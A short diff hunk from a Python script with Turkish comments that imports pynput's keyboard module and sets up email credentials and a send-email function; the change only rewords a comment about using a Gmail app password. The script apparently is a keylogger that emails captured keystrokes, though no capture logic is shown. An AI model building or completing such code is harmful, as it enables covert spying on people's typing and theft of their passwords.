@@ -6,7 +6,7 @@ from pynput import keyboard
 # E-posta ayarları
 from_email = ""  # Kendi e-posta adresini yaz
 to_email = ""    # Hedef e-posta adresini yaz
-password = ""  # Gmail şifreni buraya yaz
+password = ""  # Gmail uygulama şifreni buraya yaz (ugulama şifresi oluştur)
 
 def email_gonder(message):
     try:
